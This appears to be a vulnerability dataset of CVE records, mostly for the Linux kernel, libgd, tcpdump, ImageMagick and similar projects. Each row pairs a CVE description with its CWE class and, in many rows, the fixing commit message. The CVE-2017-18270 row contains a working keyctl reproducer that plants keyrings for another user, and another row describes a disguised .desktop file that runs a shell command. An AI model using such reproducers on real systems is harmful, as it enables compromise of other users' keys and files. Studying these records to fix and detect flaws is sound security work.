CVE-2019-11815,CWE-362,2019-05-08,"An issue was discovered in rds_tcp_kill_sock in net/rds/tcp.c in the Linux kernel before 5.0.8. There is a race condition leading to a use-after-free, related to net namespace cleanup.","When it is to cleanup net namespace, rds_tcp_exit_net() will call rds_tcp_kill_sock(), if t_sock is NULL, it will not call rds_conn_destroy(), rds_conn_path_destroy() and rds_tcp_conn_free() to free connection, and the worker cp_conn_w is not stopped, afterwards the net is freed in net_drop_ns(); While cp_conn_w rds_connect_worker() will call rds_tcp_conn_path_connect() and reference 'net' which has already been freed.  In rds_tcp_conn_path_connect(), rds_tcp_set_callbacks() will set t_sock = sock before sock->ops->connect, but if connect() is failed, it will call rds_tcp_restore_callbacks() and set t_sock = NULL, if connect is always failed, rds_connect_worker() will try to reconnect all the time, so rds_tcp_kill_sock() will never to cancel worker cp_conn_w and free the connections.  Therefore, the condition !tc->t_sock is not needed if it is going to do cleanup_net->rds_tcp_exit_net->rds_tcp_kill_sock, because tc->t_sock is always NULL, and there is on other path to cancel cp_conn_w and free connection. So this patch is to fix this.  rds_tcp_kill_sock(): ... if (net != c_net || !tc->t_sock) ... Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>  ================================================================== BUG: KASAN: use-after-free in inet_create+0xbcc/0xd28 net/ipv4/af_inet.c:340 Read of size 4 at addr ffff8003496a4684 by task kworker/u8:4/3721  CPU: 3 PID: 3721 Comm: kworker/u8:4 Not tainted 5.1.0 #11 Hardware name: linux,dummy-virt (DT) Workqueue: krdsd rds_connect_worker Call trace:  dump_backtrace+0x0/0x3c0 arch/arm64/kernel/time.c:53  show_stack+0x28/0x38 arch/arm64/kernel/traps.c:152  __dump_stack lib/dump_stack.c:77 [inline]  dump_stack+0x120/0x188 lib/dump_stack.c:113  print_address_description+0x68/0x278 mm/kasan/report.c:253  kasan_report_error mm/kasan/report.c:351 [inline]  kasan_report+0x21c/0x348 mm/kasan/report.c:409  __asan_report_load4_noabort+0x30/0x40 mm/kasan/report.c:429  inet_create+0xbcc/0xd28 net/ipv4/af_inet.c:340  __sock_create+0x4f8/0x770 net/socket.c:1276  sock_create_kern+0x50/0x68 net/socket.c:1322  rds_tcp_conn_path_connect+0x2b4/0x690 net/rds/tcp_connect.c:114  rds_connect_worker+0x108/0x1d0 net/rds/threads.c:175  process_one_work+0x6e8/0x1700 kernel/workqueue.c:2153  worker_thread+0x3b0/0xdd0 kernel/workqueue.c:2296  kthread+0x2f0/0x378 kernel/kthread.c:255  ret_from_fork+0x10/0x18 arch/arm64/kernel/entry.S:1117  Allocated by task 687:  save_stack mm/kasan/kasan.c:448 [inline]  set_track mm/kasan/kasan.c:460 [inline]  kasan_kmalloc+0xd4/0x180 mm/kasan/kasan.c:553  kasan_slab_alloc+0x14/0x20 mm/kasan/kasan.c:490  slab_post_alloc_hook mm/slab.h:444 [inline]  slab_alloc_node mm/slub.c:2705 [inline]  slab_alloc mm/slub.c:2713 [inline]  kmem_cache_alloc+0x14c/0x388 mm/slub.c:2718  kmem_cache_zalloc include/linux/slab.h:697 [inline]  net_alloc net/core/net_namespace.c:384 [inline]  copy_net_ns+0xc4/0x2d0 net/core/net_namespace.c:424  create_new_namespaces+0x300/0x658 kernel/nsproxy.c:107  unshare_nsproxy_namespaces+0xa0/0x198 kernel/nsproxy.c:206  ksys_unshare+0x340/0x628 kernel/fork.c:2577  __do_sys_unshare kernel/fork.c:2645 [inline]  __se_sys_unshare kernel/fork.c:2643 [inline]  __arm64_sys_unshare+0x38/0x58 kernel/fork.c:2643  __invoke_syscall arch/arm64/kernel/syscall.c:35 [inline]  invoke_syscall arch/arm64/kernel/syscall.c:47 [inline]  el0_svc_common+0x168/0x390 arch/arm64/kernel/syscall.c:83  el0_svc_handler+0x60/0xd0 arch/arm64/kernel/syscall.c:129  el0_svc+0x8/0xc arch/arm64/kernel/entry.S:960  Freed by task 264:  save_stack mm/kasan/kasan.c:448 [inline]  set_track mm/kasan/kasan.c:460 [inline]  __kasan_slab_free+0x114/0x220 mm/kasan/kasan.c:521  kasan_slab_free+0x10/0x18 mm/kasan/kasan.c:528  slab_free_hook mm/slub.c:1370 [inline]  slab_free_freelist_hook mm/slub.c:1397 [inline]  slab_free mm/slub.c:2952 [inline]  kmem_cache_free+0xb8/0x3a8 mm/slub.c:2968  net_free net/core/net_namespace.c:400 [inline]  net_drop_ns.part.6+0x78/0x90 net/core/net_namespace.c:407  net_drop_ns net/core/net_namespace.c:406 [inline]  cleanup_net+0x53c/0x6d8 net/core/net_namespace.c:569  process_one_work+0x6e8/0x1700 kernel/workqueue.c:2153  worker_thread+0x3b0/0xdd0 kernel/workqueue.c:2296  kthread+0x2f0/0x378 kernel/kthread.c:255  ret_from_fork+0x10/0x18 arch/arm64/kernel/entry.S:1117  The buggy address belongs to the object at ffff8003496a3f80  which belongs to the cache net_namespace of size 7872 The buggy address is located 1796 bytes inside of  7872-byte region [ffff8003496a3f80, ffff8003496a5e40) The buggy address belongs to the page: page:ffff7e000d25a800 count:1 mapcount:0 mapping:ffff80036ce4b000 index:0x0 compound_mapcount: 0 flags: 0xffffe0000008100(slab|head) raw: 0ffffe0000008100 dead000000000100 dead000000000200 ffff80036ce4b000 raw: 0000000000000000 0000000080040004 00000001ffffffff 0000000000000000 page dumped because: kasan: bad access detected  Memory state around the buggy address:  ffff8003496a4580: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb  ffff8003496a4600: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb >ffff8003496a4680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb                    ^  ffff8003496a4700: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb  ffff8003496a4780: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb ==================================================================  Fixes: 467fa15(""RDS-TCP: Support multiple RDS-TCP listen endpoints, one per netns."") Reported-by: Hulk Robot <hulkci@huawei.com> Signed-off-by: Mao Wenan <maowenan@huawei.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-5766,CWE-190,2016-08-07,"Integer overflow in the _gd2GetHeader function in gd_gd2.c in the GD Graphics Library (aka libgd) before 2.2.3, as used in PHP before 5.5.37, 5.6.x before 5.6.23, and 7.x before 7.0.8, allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via crafted chunk dimensions in an image.",
CVE-2011-1767,,2012-06-13,"net/ipv4/ip_gre.c in the Linux kernel before 2.6.34, when ip_gre is configured as a module, allows remote attackers to cause a denial of service (OOPS) by sending a packet during module loading.","GRE protocol receive hook can be called right after protocol addition is done. If netns stuff is not yet initialized, we're going to oops in net_generic().  This is remotely oopsable if ip_gre is compiled as module and packet comes at unfortunate moment of module loading.  Signed-off-by: Alexey Dobriyan <adobriyan@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-11522,CWE-476,2017-07-22,The WriteOnePNGImage function in coders/png.c in ImageMagick through 6.9.9-0 and 7.x through 7.0.6-1 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted file.,
CVE-2011-3045,CWE-190,2012-03-22,"Integer signedness error in the png_inflate function in pngrutil.c in libpng before 1.4.10beta01, as used in Google Chrome before 17.0.963.83 and other products, allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PNG file, a different vulnerability than CVE-2011-3026.",
CVE-2017-14230,CWE-20,2017-09-10,"In the mboxlist_do_find function in imap/mboxlist.c in Cyrus IMAP before 3.0.4, an off-by-one error in prefix calculation for the LIST command caused use of uninitialized memory, which might allow remote attackers to obtain sensitive information or cause a denial of service (daemon crash) via a 'LIST """" ""Other Users""' command.",
CVE-2013-7262,CWE-89,2014-01-05,"SQL injection vulnerability in the msPostGISLayerSetTimeFilter function in mappostgis.c in MapServer before 6.4.1, when a WMS-Time service is used, allows remote attackers to execute arbitrary SQL commands via a crafted string in a PostGIS TIME filter.",
CVE-2015-4178,,2016-05-02,"The fs_pin implementation in the Linux kernel before 4.0.5 does not ensure the internal consistency of a certain list data structure, which allows local users to cause a denial of service (system crash) by leveraging user-namespace root access for an MNT_DETACH umount2 system call, related to fs/fs_pin.c and include/linux/fs_pin.h.","This is needed to support lazily umounting locked mounts.  Because the entire unmounted subtree needs to stay together until there are no users with references to any part of the subtree.  To support this guarantee that the fs_pin m_list and s_list nodes are initialized by initializing them in init_fs_pin allowing for the possibility that pin_insert_group does not touch them.  Further use hlist_del_init in pin_remove so that there is a hlist_unhashed test before the list we attempt to update the previous list item.  Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com>"
CVE-2018-14461,CWE-125,2019-10-03,The LDP parser in tcpdump before 4.9.3 has a buffer over-read in print-ldp.c:ldp_tlv_print().,"In ldp_tlv_print(), the FT Session TLV length must be 12, not 8 (RFC3479)  This fixes a buffer over-read discovered by Konrad Rieck and Bhargava Shastry.  Add a test using the capture file supplied by the reporter(s).  Moreover: Add and use tstr[]. Add a comment."
CVE-2011-4914,CWE-20,2012-06-21,"The ROSE protocol implementation in the Linux kernel before 2.6.39 does not verify that certain data-length values are consistent with the amount of data sent, which might allow remote attackers to obtain sensitive information from kernel memory or cause a denial of service (out-of-bounds read) via crafted data to a ROSE socket.",Define some constant offsets for CALL_REQUEST based on the description at <http://www.techfest.com/networking/wan/x25plp.htm> and the definition of ROSE as using 10-digit (5-byte) addresses.  Use them consistently.  Validate all implicit and explicit facilities lengths. Validate the address length byte rather than either trusting or assuming its value.  Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2015-3288,CWE-20,2016-10-16,"mm/memory.c in the Linux kernel before 4.1.4 mishandles anonymous pages, which allows local users to gain privileges or cause a denial of service (page tainting) via a crafted application that triggers writing to page zero.","Reading page fault handler code I've noticed that under right circumstances kernel would map anonymous pages into file mappings: if the VMA doesn't have vm_ops->fault() and the VMA wasn't fully populated on ->mmap(), kernel would handle page fault to not populated pte with do_anonymous_page().  Let's change page fault handler to use do_anonymous_page() only on anonymous VMA (->vm_ops == NULL) and make sure that the VMA is not shared.  For file mappings without vm_ops->fault() or shred VMA without vm_ops, page fault on pte_none() entry would lead to SIGBUS.  Signed-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com> Acked-by: Oleg Nesterov <oleg@redhat.com> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Willy Tarreau <w@1wt.eu> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2015-8863,CWE-119,2016-05-06,"Off-by-one error in the tokenadd function in jv_parse.c in jq allows remote attackers to cause a denial of service (crash) via a long JSON-encoded number, which triggers a heap-based buffer overflow.",This was an off-by one: the NUL terminator byte was not allocated on resize.  This was triggered by JSON-encoded numbers longer than 256 bytes.
CVE-2016-3120,CWE-476,2016-08-01,"The validate_as_request function in kdc_util.c in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.13.6 and 1.4.x before 1.14.3, when restrict_anonymous_to_tgt is enabled, uses an incorrect client data structure, which allows remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) via an S4U2Self request.","In validate_as_request(), when enforcing restrict_anonymous_to_tgt, use client.princ instead of request->client; the latter is NULL when validating S4U2Self requests.  CVE-2016-3120:  In MIT krb5 1.9 and later, an authenticated attacker can cause krb5kdc to dereference a null pointer if the restrict_anonymous_to_tgt option is set to true, by making an S4U2Self request.    CVSSv2 Vector: AV:N/AC:H/Au:S/C:N/I:N/A:C/E:H/RL:OF/RC:C  ticket: 8458 (new) target_version: 1.14-next target_version: 1.13-next"
CVE-2015-0291,,2015-03-19,The sigalgs implementation in t1_lib.c in OpenSSL 1.0.2 before 1.0.2a allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) by using an invalid signature_algorithms extension in the ClientHello message during a renegotiation.,
CVE-2017-9242,CWE-20,2017-05-27,"The __ip6_append_data function in net/ipv6/ip6_output.c in the Linux kernel through 4.11.3 is too late in checking whether an overwrite of an skb data structure may occur, which allows local users to cause a denial of service (system crash) via crafted system calls.","Andrey Konovalov and idaifish@gmail.com reported crashes caused by one skb shared_info being overwritten from __ip6_append_data()  Andrey program lead to following state :  copy -4200 datalen 2000 fraglen 2040 maxfraglen 2040 alloclen 2048 transhdrlen 0 offset 0 fraggap 6200  The skb_copy_and_csum_bits(skb_prev, maxfraglen, data + transhdrlen, fraggap, 0); is overwriting skb->head and skb_shared_info  Since we apparently detect this rare condition too late, move the code earlier to even avoid allocating skb and risking crashes.  Once again, many thanks to Andrey and syzkaller team.  Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Reported-by: <idaifish@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-9141,CWE-20,2017-05-22,"In ImageMagick 7.0.5-7 Q16, a crafted file could trigger an assertion failure in the ResetImageProfileIterator function in MagickCore/profile.c because of missing checks in the ReadDDSImage function in coders/dds.c.",
CVE-2017-9520,CWE-416,2017-06-08,The r_config_set function in libr/config/config.c in radare2 1.5.0 allows remote attackers to cause a denial of service (use-after-free and application crash) via a crafted DEX file.,
CVE-2017-12996,CWE-125,2017-09-14,The PIMv2 parser in tcpdump before 4.9.2 has a buffer over-read in print-pim.c:pimv2_print().,"We do bounds checks based on the TLV length, so if the TLV's length is too short, and we don't check for that, we could end up fetching data past the end of the TLV - including past the length of the captured data in the packet.  This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add tests using the capture files supplied by the reporter(s)."
CVE-2017-13035,CWE-125,2017-09-14,The ISO IS-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:isis_print_id().,"Some of them are variable-length, with a field giving the total length, and therefore they can be shorter than 6 octets.  If one is, don't run past the end.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture."
CVE-2015-8785,CWE-835,2016-02-08,The fuse_fill_write_pages function in fs/fuse/file.c in the Linux kernel before 4.4 allows local users to cause a denial of service (infinite loop) via a writev system call that triggers a zero length for the first segment of an iov.,"I got a report about unkillable task eating CPU. Further investigation shows, that the problem is in the fuse_fill_write_pages() function. If iov's first segment has zero length, we get an infinite loop, because we never reach iov_iter_advance() call.  Fix this by calling iov_iter_advance() before repeating an attempt to copy data from userspace.  A similar problem is described in 124d3b7 (""fix writev regression: pan hanging unkillable and un-straceable""). If zero-length segmend is followed by segment with invalid address, iov_iter_fault_in_readable() checks only first segment (zero-length), iov_iter_copy_from_user_atomic() skips it, fails at second and returns zero -> goto again without skipping zero-length segment.  Patch calls iov_iter_advance() before goto again: we'll skip zero-length segment at second iteraction and iov_iter_fault_in_readable() will detect invalid address.  Special thanks to Konstantin Khlebnikov, who helped a lot with the commit description.  Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Maxim Patlasov <mpatlasov@parallels.com> Cc: Konstantin Khlebnikov <khlebnikov@yandex-team.ru> Signed-off-by: Roman Gushchin <klamm@yandex-team.ru> Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Fixes: ea9b990 (""fuse: implement perform_write"") Cc: <stable@vger.kernel.org>"
CVE-2017-18270,,2018-05-18,"In the Linux kernel before 4.13.5, a local user could create keyrings for other users via keyctl commands, setting unwanted defaults or causing a denial of service.","It was possible for an unprivileged user to create the user and user session keyrings for another user.  For example:      sudo -u '#3000' sh -c 'keyctl add keyring _uid.4000 """" @U                            keyctl add keyring _uid_ses.4000 """" @U                            sleep 15' &     sleep 1     sudo -u '#4000' keyctl describe @U     sudo -u '#4000' keyctl describe @us  This is problematic because these ""fake"" keyrings won't have the right permissions.  In particular, the user who created them first will own them and will have full access to them via the possessor permissions, which can be used to compromise the security of a user's keys:      -4: alswrv-----v------------  3000     0 keyring: _uid.4000     -5: alswrv-----v------------  3000     0 keyring: _uid_ses.4000  Fix it by marking user and user session keyrings with a flag KEY_FLAG_UID_KEYRING.  Then, when searching for a user or user session keyring by name, skip all keyrings that don't have the flag set.  Fixes: 69664cf (""keys: don't generate user and user session keyrings unless they're accessed"") Cc: <stable@vger.kernel.org>	[v2.6.26+] Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com>"
CVE-2017-7542,CWE-190,2017-07-21,The ip6_find_1stfragopt function in net/ipv6/output_core.c in the Linux kernel through 4.12.3 allows local users to cause a denial of service (integer overflow and infinite loop) by leveraging the ability to open a raw socket.,"In some cases, offset can overflow and can cause an infinite loop in ip6_find_1stfragopt(). Make it unsigned int to prevent the overflow, and cap it at IPV6_MAXPLEN, since packets larger than that should be invalid.  This problem has been here since before the beginning of git history.  Signed-off-by: Sabrina Dubroca <sd@queasysnail.net> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-3074,CWE-681,2016-04-26,"Integer signedness error in GD Graphics Library 2.1.1 (aka libgd or libgd2) allows remote attackers to cause a denial of service (crash) or potentially execute arbitrary code via crafted compressed gd2 data, which triggers a heap-based buffer overflow.",Make sure we do some range checking on corrupted chunks.  Thanks to Hans Jerry Illikainen <hji@dyntopia.com> for indepth report and reproducer information.  Made for easy test case writing :).
CVE-2011-2493,,2012-06-13,"The ext4_fill_super function in fs/ext4/super.c in the Linux kernel before 2.6.39 does not properly initialize a certain error-report data structure, which allows local users to cause a denial of service (OOPS) by attempting to mount a crafted ext4 filesystem.","During mount, when we fail to open journal inode or root inode, the __save_error_info will mod_timer. But actually s_err_report isn't initialized yet and the kernel oops. The detailed information can be found https://bugzilla.kernel.org/show_bug.cgi?id=32082.  The best way is to check whether the timer s_err_report is initialized or not. But it seems that in include/linux/timer.h, we can't find a good function to check the status of this timer, so this patch just move the initializtion of s_err_report earlier so that we can avoid the kernel panic. The corresponding del_timer is also added in the error path.  Reported-by: Sami Liedes <sliedes@cc.hut.fi> Signed-off-by: Tao Ma <boyu.mt@taobao.com> Signed-off-by: ""Theodore Ts'o"" <tytso@mit.edu>"
CVE-2017-14604,CWE-20,2017-09-20,"GNOME Nautilus before 3.23.90 allows attackers to spoof a file type by using the .desktop file extension, as demonstrated by an attack in which a .desktop file's Name field ends in .pdf but this file's Exec field launches a malicious ""sh -c"" command. In other words, Nautilus provides no UI indication that a file actually has the potentially unsafe .desktop extension; instead, the UI only shows the .pdf extension. One (slightly) mitigating factor is that an attack requires the .desktop file to have execute permission. The solution is to ask the user to confirm that the file is supposed to be treated as a .desktop file, and then remember the user's answer in the metadata::trusted field.","Currently we only trust desktop files that have the executable bit set, and don't replace the displayed icon or the displayed name until it's trusted, which prevents for running random programs by a malicious desktop file.  However, the executable permission is preserved if the desktop file comes from a compressed file.  To prevent this, add a metadata::trusted metadata to the file once the user acknowledges the file as trusted. This adds metadata to the file, which cannot be added unless it has access to the computer.  Also remove the SHEBANG ""trusted"" content we were putting inside the desktop file, since that doesn't add more security since it can come with the file itself.  https://bugzilla.gnome.org/show_bug.cgi?id=777991"
CVE-2013-7022,CWE-119,2013-12-09,"The g2m_init_buffers function in libavcodec/g2meet.c in FFmpeg before 2.1 does not properly allocate memory for tiles, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Go2Webinar data.",Currently the code can in some cases draw tiles that hang outside the allocated buffer. This patch increases the buffer size to avoid out of array accesses. An alternative would be to fail if such tiles are encountered. I do not know if any valid files use such hanging tiles.  Fixes Ticket2971 Found-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2013-7294,CWE-20,2014-01-16,The ikev2parent_inI1outR1 function in pluto/ikev2_parent.c in libreswan before 3.7 allows remote attackers to cause a denial of service (restart) via an IKEv2 I1 notification without a KE payload.,
CVE-2018-21028,CWE-772,2019-10-11,Boa through 0.94.14rc21 allows remote attackers to trigger a memory leak because of missing calls to the free function.,
CVE-2016-2179,CWE-399,2016-09-16,"The DTLS implementation in OpenSSL before 1.1.0 does not properly restrict the lifetime of queue entries associated with unused out-of-order messages, which allows remote attackers to cause a denial of service (memory consumption) by maintaining many crafted DTLS sessions simultaneously, related to d1_lib.c, statem_dtls.c, statem_lib.c, and statem_srvr.c.",
CVE-2015-5273,CWE-59,2015-12-07,The abrt-action-install-debuginfo-to-abrt-cache help program in Automatic Bug Reporting Tool (ABRT) before 2.7.1 allows local users to write to arbitrary files via a symlink attack on unpacked.cpio in a pre-created directory with a predictable name in /var/tmp.,"The set-user-ID wrapper must use own new temporary directory in order to avoid security issues with unpacking specially crafted debuginfo packages that might be used to create files or symlinks anywhere on the file system as the abrt user.  Withot the forking code the temporary directory would remain on the filesystem in the case where all debuginfo data are already available. This is caused by the fact that the underlying libreport functionality accepts path to a desired temporary directory and creates it only if necessary. Otherwise, the directory is not touched at all.  This commit addresses CVE-2015-5273  Signed-off-by: Jakub Filak <jfilak@redhat.com>"
CVE-2017-7500,CWE-59,2018-08-13,"It was found that rpm did not properly handle RPM installations when a destination path was a symbolic link to a directory, possibly changing ownership and permissions of an arbitrary directory, and RPM files being placed in an arbitrary destination. An attacker, with write access to a directory in which a subdirectory will be installed, could redirect that directory to an arbitrary location and gain root privilege.","Only follow directory symlinks owned by target directory owner or root during verification to match the behavior of fsmVerify() in the new CVE-2017-7500 world order.  The code is klunkier than it should and the logic should use common code with fsmVerify() instead of duplicating it here, but that needs more changes than is comfortable to backport so starting with this.  Also worth noting that the previous ""follow the link"" logic from commit 3ccd774 was not quite right, it'd fail with RPMVERIFY_LSTATFAIL on a broken symlink when it should've ran verification on the symlink itself. This behavior is fixed here too.  Finally, once again fakechroot gets in the way and forces the related verify testcase to be changed to be able to create a valid link. Reuse the replacement testcase for the purpose and add another case for verifying an invalid link."
CVE-2018-20961,CWE-415,2019-08-07,"In the Linux kernel before 4.16.4, a double free vulnerability in the f_midi_set_alt function of drivers/usb/gadget/function/f_midi.c in the f_midi driver may allow attackers to cause a denial of service or possibly have unspecified other impact.","It looks like there is a possibility of a double-free vulnerability on an error path of the f_midi_set_alt function in the f_midi driver. If the path is feasible then free_ep_req gets called twice:           req->complete = f_midi_complete;          err = usb_ep_queue(midi->out_ep, req, GFP_ATOMIC);             => ...              usb_gadget_giveback_request                =>                  f_midi_complete (CALLBACK)                    (inside f_midi_complete, for various cases of status)                    free_ep_req(ep, req); // first kfree          if (err) {                  ERROR(midi, ""%s: couldn't enqueue request: %d\n"",                              midi->out_ep->name, err);                  free_ep_req(midi->out_ep, req); // second kfree                  return err;          }  The double-free possibility was introduced with commit ad0d1a0 (""usb: gadget: f_midi: fix leak on failed to enqueue out requests"").  Found by MOXCAFE tool.  Signed-off-by: Tuba Yavuz <tuba@ece.ufl.edu> Fixes: ad0d1a0 (""usb: gadget: f_midi: fix leak on failed to enqueue out requests"") Acked-by: Felipe Balbi <felipe.balbi@linux.intel.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2018-11596,CWE-119,2018-05-31,Espruino before 1.99 allows attackers to cause a denial of service (application crash) with a user crafted input file via a Buffer Overflow during syntax parsing because a check for '\0' is made for the wrong array element in jsvar.c.,
CVE-2019-13391,CWE-125,2019-07-07,"In ImageMagick 7.0.8-50 Q16, ComplexImages in MagickCore/fourier.c has a heap-based buffer over-read because of incorrect calls to GetCacheViewVirtualPixels.",
CVE-2018-16276,CWE-787,2018-08-31,An issue was discovered in yurex_read in drivers/usb/misc/yurex.c in the Linux kernel before 4.17.7. Local attackers could use user access read/writes with incorrect bounds checking in the yurex USB driver to crash the kernel or potentially escalate privileges.,"In general, accessing userspace memory beyond the length of the supplied buffer in VFS read/write handlers can lead to both kernel memory corruption (via kernel_read()/kernel_write(), which can e.g. be triggered via sys_splice()) and privilege escalation inside userspace.  Fix it by using simple_read_from_buffer() instead of custom logic.  Fixes: 6bc235a (""USB: add driver for Meywa-Denki & Kayac YUREX"") Signed-off-by: Jann Horn <jannh@google.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2018-8098,CWE-190,2018-03-14,Integer overflow in the index.c:read_entry() function while decompressing a compressed prefix length in libgit2 before v0.26.2 allows an attacker to cause a denial of service (out-of-bounds read) via a crafted repository index file.,"When computing the complete path length from the encoded prefix-compressed path, we end up just allocating the complete path without ever checking what the encoded path length actually is. This can easily lead to a denial of service by just encoding an unreasonable long path name inside of the index. Git already enforces a maximum path length of 4096 bytes. As we also have that enforcement ready in some places, just make sure that the resulting path is smaller than GIT_PATH_MAX.  Reported-by: Krishna Ram Prakash R <krp@gtux.in> Reported-by: Vivek Parikh <viv0411.parikh@gmail.com>"
CVE-2017-11399,CWE-125,2017-07-17,Integer overflow in the ape_decode_frame function in libavcodec/apedec.c in FFmpeg 2.4 through 3.3.2 allows remote attackers to cause a denial of service (out-of-array access and application crash) or possibly have unspecified other impact via a crafted APE file.,"Fixes: out of array access Fixes: PoC.ape and others  Found-by: Bingchang, Liu@VARAS of IIE Signed-off-by: Michael Niedermayer <michael@niedermayer.cc> (cherry picked from commit ba4beaf) Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2011-5321,,2016-05-02,"The tty_open function in drivers/tty/tty_io.c in the Linux kernel before 3.1.1 mishandles a driver-lookup failure, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via crafted access to a device file under the /dev/pts directory.","When tty_driver_lookup_tty fails in tty_open, we forget to drop a reference to the tty driver. This was added by commit 4a2b5fd (Move tty lookup/reopen to caller).  Fix that by adding tty_driver_kref_put to the fail path.  I will refactor the code later. This is for the ease of backporting to stable.  Introduced-in: v2.6.28-rc2 Signed-off-by: Jiri Slaby <jslaby@suse.cz> Cc: stable <stable@vger.kernel.org> Cc: Alan Cox <alan@lxorguk.ukuu.org.uk> Acked-by: Sukadev Bhattiprolu <sukadev@linux.vnet.ibm.com> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>"
CVE-2016-3134,CWE-119,2016-04-27,"The netfilter subsystem in the Linux kernel through 4.5.2 does not validate certain offset fields, which allows local users to gain privileges or cause a denial of service (heap memory corruption) via an IPT_SO_SET_REPLACE setsockopt call.","Ben Hawkes says:   In the mark_source_chains function (net/ipv4/netfilter/ip_tables.c) it  is possible for a user-supplied ipt_entry structure to have a large  next_offset field. This field is not bounds checked prior to writing a  counter value at the supplied offset.  Problem is that mark_source_chains should not have been called -- the rule doesn't have a next entry, so its supposed to return an absolute verdict of either ACCEPT or DROP.  However, the function conditional() doesn't work as the name implies. It only checks that the rule is using wildcard address matching.  However, an unconditional rule must also not be using any matches (no -m args).  The underflow validator only checked the addresses, therefore passing the 'unconditional absolute verdict' test, while mark_source_chains also tested for presence of matches, and thus proceeeded to the next (not-existent) rule.  Unify this so that all the callers have same idea of 'unconditional rule'.  Reported-by: Ben Hawkes <hawkes@google.com> Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2017-12893,CWE-125,2017-09-14,The SMB/CIFS parser in tcpdump before 4.9.2 has a buffer over-read in smbutil.c:name_len().,"After we advance the pointer by the length value in the buffer, make sure it points to something in the captured data.  This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add a test using the capture file supplied by the reporter(s)."
CVE-2012-2744,,2012-08-09,"net/ipv6/netfilter/nf_conntrack_reasm.c in the Linux kernel before 2.6.34, when the nf_conntrack_ipv6 module is enabled, allows remote attackers to cause a denial of service (NULL pointer dereference and system crash) via certain types of fragmented IPv6 packets.","When an ICMPV6_PKT_TOOBIG message is received with a MTU below 1280, all further packets include a fragment header.  Unlike regular defragmentation, conntrack also needs to ""reassemble"" those fragments in order to obtain a packet without the fragment header for connection tracking. Currently nf_conntrack_reasm checks whether a fragment has either IP6_MF set or an offset != 0, which makes it ignore those fragments.  Remove the invalid check and make reassembly handle fragment queues containing only a single fragment.  Reported-and-tested-by: Ulrich Weber <uweber@astaro.com> Signed-off-by: Patrick McHardy <kaber@trash.net>"
CVE-2019-15148,CWE-787,2019-08-18,GoPro GPMF-parser 1.2.2 has an out-of-bounds write in OpenMP4Source in demo/GPMF_mp4reader.c.,
CVE-2013-2929,CWE-264,2013-12-09,"The Linux kernel before 3.12.2 does not properly use the get_dumpable function, which allows local users to bypass intended ptrace restrictions or obtain sensitive information from IA64 scratch registers via a crafted application, related to kernel/ptrace.c and arch/ia64/include/asm/processor.h.","The get_dumpable() return value is not boolean.  Most users of the function actually want to be testing for non-SUID_DUMP_USER(1) rather than SUID_DUMP_DISABLE(0).  The SUID_DUMP_ROOT(2) is also considered a protected state.  Almost all places did this correctly, excepting the two places fixed in this patch.  Wrong logic:     if (dumpable == SUID_DUMP_DISABLE) { /* be protective */ }         or     if (dumpable == 0) { /* be protective */ }         or     if (!dumpable) { /* be protective */ }  Correct logic:     if (dumpable != SUID_DUMP_USER) { /* be protective */ }         or     if (dumpable != 1) { /* be protective */ }  Without this patch, if the system had set the sysctl fs/suid_dumpable=2, a user was able to ptrace attach to processes that had dropped privileges to that user.  (This may have been partially mitigated if Yama was enabled.)  The macros have been moved into the file that declares get/set_dumpable(), which means things like the ia64 code can see them too.  CVE-2013-2929  Reported-by: Vasily Kulikov <segoon@openwall.com> Signed-off-by: Kees Cook <keescook@chromium.org> Cc: ""Luck, Tony"" <tony.luck@intel.com> Cc: Oleg Nesterov <oleg@redhat.com> Cc: ""Eric W. Biederman"" <ebiederm@xmission.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: 